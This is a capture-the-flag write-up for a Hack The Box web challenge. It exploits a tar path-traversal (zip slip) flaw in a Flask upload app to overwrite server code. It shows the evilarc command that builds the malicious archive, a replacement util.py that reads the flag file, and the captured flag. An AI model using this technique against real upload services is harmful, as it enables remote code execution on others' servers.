# (Web) Slippy

### Proof of Concept

We are given a simple Flask web app that allows the user to upload a file, saves it on its backend, and presents a link to the file.
There are only two routes present in the `routes.py` file. The '/' route renders the frontend, while the '/unslippy' route takes an uploaded file, passes it to `extract_from-archive()`, and returns whatever the function returns as part of a dictionary.

The bulk of the application is the `extract_from_archive()` function in the `util.py` file. The function untar's the provided tar file, and creates a random-name directory in the `archives/` folder. It attempts to move the untared files to the new directory by renaming the file paths to the archives folder directory concatenated with the filename.

### Vulnerability Explanation

No checks are performed on the contents of the tar file or the filenames. The attempt to move the file into the desired directory is also simplistic. We can construct a tar file that when processed will perform a directory traversal and can be placed in any arbitrary location.

### Solvers/Scripts Used

The script `evilarc.py` (in accompanying folder, initially found online at https://github.com/ptoomey3/evilarc/blob/master/evilarc.py), given a file and a location string, will construct a tar file that, when untared, will place the provided file at the specified location on the target system. To be useful, we should overwrite a currently existing file that can be run on command; the `util.py` file itself seems like a good choice. I created a malicious `util.py` file (in accompanying folder) by adding lines at the end of the `extract_from_archive()` function that access the flag file and put its contents in the returned dictionary:

```python
def extract_from_archive(file):
	...
        flagfile = open("/app/flag", "r")
        line = flagfile.read()

        return [line]
...
```

With the `evilarc.py` and `util.py` files in the same directory, running the following command generates the malicious tar file:

```bash
$ ./evilarc.py -f evil.tar.gz -o unix -p "app/application" util.py
Creating evil.tar.gz containing ../../../../../../../../app/application/util.py
```

We upload the file in the application and refresh the page. Since the flag will be returned to the frontend on the next upload, we modify the frontend javascript `main.js` file to print whatever the api call returns:

```javascript
...
const upload = async (upFile) => {
	...
	await fetch('/api/unslippy', {
			method: 'POST',
			credentials: 'include',
			body: formData,
	}).then((response) => response.json()
	.then((resp) => {
		console.log(resp); // added print line
		...
	}
	...
}
...
```

Finally, we upload the same tar file to the application, and the key will be printed to the console: HTB{i_slipped_my_way_to_rce}
